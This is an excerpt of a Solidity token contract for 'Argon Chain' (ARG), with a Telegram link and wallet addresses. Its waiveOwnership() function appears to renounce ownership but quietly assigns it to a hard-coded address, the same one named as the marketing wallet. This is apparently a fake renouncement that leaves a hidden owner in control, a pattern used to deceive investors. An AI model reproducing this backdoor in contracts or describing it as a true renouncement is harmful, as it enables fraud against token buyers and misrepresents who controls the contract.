...
Telegram https://t.me/argonchain
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xac0D9721Daf99bcad1b64dE6e287Ad5784C4aA09);
    }
...
contract ArgonChain is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Argon Chain";
    string private _symbol = "ARG";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xac0D9721Daf99bcad1b64dE6e287Ad5784C4aA09);
    address payable public teamWalletAddress = payable(0xc9D500034e59F363D9E1191D0b03D9415C7c7604);
